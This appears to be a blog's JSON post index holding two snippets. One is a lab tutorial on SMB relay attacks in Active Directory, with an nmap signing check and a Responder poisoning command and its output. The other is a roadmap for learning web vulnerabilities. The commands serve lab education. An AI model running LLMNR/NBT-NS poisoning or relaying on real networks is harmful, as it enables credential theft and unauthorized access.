[ { "title": "SMB Relay Attack", "url": "/posts/smb-relay-attack/", "categories": "Network Security, Active Directory, Initial Attack Vectors", "tags": "activedirectory, networksec, redteaming, offensivesec", "date": "2022-10-29 12:00:00 +0100", "snippet": "What is SMB?The Server Message Block (SMB) protocol provides access to data, printers, and ser‐vice endpoints (via named pipes), At a high level, SMB communication is easy to understand. SMB clients connect to an SMB server using the SMB port to access SMB shares. Once they access the SMB shares, clients can do things such as collaborate on files without downloading them to their machines or print using a networked printer.What is SMB Relay Attack?SMB Relay Attack is a type of attack which relies on NTLM v2 authentication that is normally used in most companies.Unfortunately, when we are listening to what is going on in the network, we’re able to capture a certain part of the traffic related to the authentication (using Responder) and instead of cracking hashes gathered, we can instead relay thosehashes to specific machines and potentiallygain accessBut successfully relay those hashes, two conditions must be satisfied : SMB signing must be disabled on the target (it’s a security mechanism in the SMB protocol) Relayed user credentials must be adminon machineSMB Relay AttackPractical Attack ScenarioI didn’t find any HTB lab that contains this type of attacks so I decided to rebuild the Active Directory Lab by TCM Academy. Identifying hosts with SMB signing disabled with NMAP: ┌──(cowdex㉿kali)-[~]└─$ nmap --script smb-security-mode.nse -Pn -p445 192.168.181.140 Running Responder on the Attacker Machine:```bash┌──(cowdex㉿kali)-[~]└─$ esponder -I eth0 -d -w __ .—-.—–.—–.—–.—–.—–.–| |.—–.—-. | | -| –| _ | _ | | _ || -| _| || |__|| __|||||||| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0 To support this project: Patreon -&gt; https://www.patreon.com/PythonResponder Paypal -&gt; https://paypal.me/PythonResponderAuthor: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C[+] Poisoners: LLMNR [ON] NBT-NS [ON] MDNS [ON] DNS [ON] DHCP [ON][+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [ON] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] DCE-RPC server [ON] WinRM server [ON][+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF][+] Poisoning Options: Analyze Mode [OFF] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Force ESS downgrade [OFF][+] Generic Options: Responder NIC [eth0] Responder IP [192.168.181.128] Responder IPv6 [fe80::20c:29ff:fefd:7a6d] Challenge set [random] Don’t Respond To Names [‘ISATAP’][+] Current Session Variables: Responder Machine Name [WIN-AGGZ030QBTK] Responder Domain Name [C249.LOCAL] Responder DCE-RPC Port [48698][+] Listening for events…[*] [DHCP] Found DHCP server IP: 192.168.181.254, now waiting for incoming requests…```" }, { "title": "My Learning Methodology for OWASP Top 10", "url": "/posts/my-learning-methodology-for-owasp-top-10/", "categories": "Web Security, Web Application Vulnerabilities", "tags": "methodology, owasptop10, bugbounty, pentesting, webapplication", "date": "2022-10-12 12:00:00 +0100", "snippet": "Hello, to give something back to the infosec community I decided to start a new series on web application pen-testing. And this would be the first post.As a Noob, I was struggling to find an effective way to learn about web application vulnerabilities, once you start looking for some learning resources and methodologies you’ll be lost in between Youtube videos, tweets, and even medium articles. I tried to put it all together and create my methodology. Here are my steps :Web Vulnerabilities RoadmapStep 1 : Learn the basics in a fun wayPicking up the initial idea about a web attack is an easy process if you have a guide walking you through it. when it comes to web vulnerabilities the best way to understand the basics is by watching a youtube video, PwnFunction is my best channel as he explains using illustrations and some simple examples which makes it beginner friendly. Intigriti also has some good explanation videos. If you understand Arabic the best playlist for you would be : Web Application Penetration Testing Course by Ebrahem HegazyStep 2 : Dig a little bit deeper by reading a book chapterAfter having a general idea about a web vulnerability, don’t jump directly to solve labs or CTFs, try to understand its different scenarios, bypass &amp; prevention techniques. There are a lot of books out there, the popular one is : The Web Application Hacker’s Handbook but I don’t use this book, it’s about 912 pages and it’s kinda outdated. Instead, I do recommend the Bug Bounty Bootcamp : it’s a comprehensive guide for any web application hacker with a detailed exploration of the many vulnerabilities present in modern websites and the hands-on techniques you can use to most successfully exploit them.The book contains a wide range of techniques : Identify and successfully exploit a wide array of common web vulnerabilities Set up a hacking environment, configure Burp Suite, and use its modules to intercept traffic and hunt for bugs Chain together multiple bugs for maximum impact and higher payouts Bypass protection mechanisms like input sanitization and blocklists to make your attacks succeed Automate tedious bug-hunting tasks with fuzzing and bash scriptingStep 3 : Get your hands dirty with labsNow it’s time to practice what you learned. When it comes to web security the best platform for you would be the Web Security Academy, it contains high-quality learning materials, interactive vulnerability labs, and video tutorials. You can learn at your own pace, wherever and whenever suits you. Best of all, everything is free!The Web Security Academy is a living resource that we’ll continue updating with new material and labs (Now it has more than 220 lab), covering the latest developments in web security research. We very much hope that the Web Security Academy will fulfill the purpose that The Web Application Hacker’s Handbook has done in the past, and help the next generation of web hackers acquire the skills and knowledge that they need.Step 4 : Notetaking keeps you alertKeeping notes is one of the key aspects of penetration testing, I personally use Notion for several reasons : The Flexibility of a Paper Notebook Project and Task Management In One Place Digital Brain to Store, Organize, Share information Free for Personal Use Accessible on mobile devicesStep 5 : Read writeups &amp; Code, Play some CTFsAfter completing all the previous steps you should take a look at some real-world scenarios, read POCs and writeups on Medium or hackerone because when you read a writeup about a particular vulnerability or something else, you are reading it from someone else experience. You’ll sometimes come across the source code of an application you’re attacking. For example, you might be able to extract JavaScript code from a web application, find scripts stored on servers during the recon process or during a pentest you have access to source codeIf so, you are in luck! Reviewing code is one of the best ways to find vulnerabilities in applications. Souce Code Wiki is a culmination of Secure Coding Practices for a wide range of languages. I read some PHP code there from time to time.The last thing that I’m planning to start and I know that it’s highly recommended is to start solving Pentesterlab as it contains some realistic scenarios and new CVEs…Well, that was my simple methodology to learn web application vulnerabilities don’t forget to share with your friends, happy hacking!" } ]
